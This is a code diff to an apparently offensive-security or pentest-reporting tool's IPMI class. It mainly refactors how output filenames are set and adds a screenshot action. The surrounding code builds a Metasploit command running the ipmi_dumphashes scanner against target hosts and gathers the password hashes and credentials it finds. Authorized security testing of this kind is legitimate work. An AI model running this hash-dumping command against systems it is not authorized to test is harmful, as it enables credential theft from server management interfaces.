@@ -6,15 +6,13 @@ from src.utilities.utilities import error_handler
 class IPMISolverClass(BaseSolverClass):
     def __init__(self) -> None:
         super().__init__("IPMI", 20)
+        self.output_filename_for_all = "ipmi.txt"
+        self.output_png_for_action = "ipmi.png"
+        self.action_title = "IPMI"
 
     @error_handler([])
     def solve(self, args):
         self.process_args(args)
-
-        if self.output:
-            if not self.output.endswith("/"):
-                self.output += "/"
-            self.output += "ipmi.txt" 
 
         if not self.hosts:
             return
@@ -24,8 +22,7 @@ class IPMISolverClass(BaseSolverClass):
             print("Running metasploit ipmi dumphashes module, there will be no progression bar")
             hashes = {}
             creds = {}
-            
-            
+
             result = ", ".join(h.ip for h in self.hosts)
             command = ["msfconsole", "-q", "-x", f"color false; use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {result}; set THREADS {args.threads}; run; exit"]
 
@@ -48,6 +45,7 @@ class IPMISolverClass(BaseSolverClass):
                     self.print_output(f"{key}:")
                     for v in value:
                         self.print_output(f"    {v}")
+                self.create_windowcatcher_action()
 
             if creds:
                 self.print_output("IPMI Creds found:")
